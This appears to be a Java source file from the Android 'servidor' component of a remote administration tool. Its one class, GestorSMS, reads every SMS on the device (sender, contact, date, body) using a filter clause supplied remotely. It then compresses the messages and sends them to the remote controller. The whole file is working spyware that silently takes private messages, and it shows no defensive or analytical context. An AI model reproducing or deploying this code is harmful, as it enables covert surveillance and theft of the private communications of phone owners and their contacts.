package com.qooport.android.servidor;
import java.util.ArrayList;
import android.database.Cursor;
import android.net.Uri;
import comunes.Sms;
import com.qooport.android.Servicio;
import com.qooport.android.utilidades.Protocolo;
public class GestorSMS {
    public static boolean listarSMS(Servicio c, byte[] args) {
        ArrayList<Sms> l = new ArrayList<Sms>();
        boolean ret = false;
        String WHERE_CONDITION;
        if (args != null) {
            WHERE_CONDITION = new String(args);
        } else {
            WHERE_CONDITION = "";
        }
        String SORT_ORDER = "date DESC";
        String[] column = {"_id", "thread_id", "address", "person", "date", "read", "body", "type"};
        String CONTENT_URI = "content://sms/"; //content://sms/inbox, content://sms/sent
        Cursor cursor = c.getContexto().getContentResolver().query(Uri.parse(CONTENT_URI), column, WHERE_CONDITION, null, SORT_ORDER);
        if (cursor.getCount() != 0) {
            cursor.moveToFirst();
            do {
                if (cursor.getColumnCount() != 0) {
                    int id = cursor.getInt(cursor.getColumnIndex("_id"));
                    int thid = cursor.getInt(cursor.getColumnIndex("thread_id"));
                    String add = cursor.getString(cursor.getColumnIndex("address"));
                    int person = cursor.getInt(cursor.getColumnIndex("person"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    int read = cursor.getInt(cursor.getColumnIndex("read"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    int type = cursor.getInt(cursor.getColumnIndex("type"));
                    l.add(new Sms(id, thid, add, person, date, read, body, type));
                }
            } while (cursor.moveToNext());
            ret = true;
            c.enviarComando(Protocolo.listarSMS);
            c.enviarObjeto(c.comprimirObjecto(l));
        } else {
            ret = false;
        }
        return ret;
    }
}
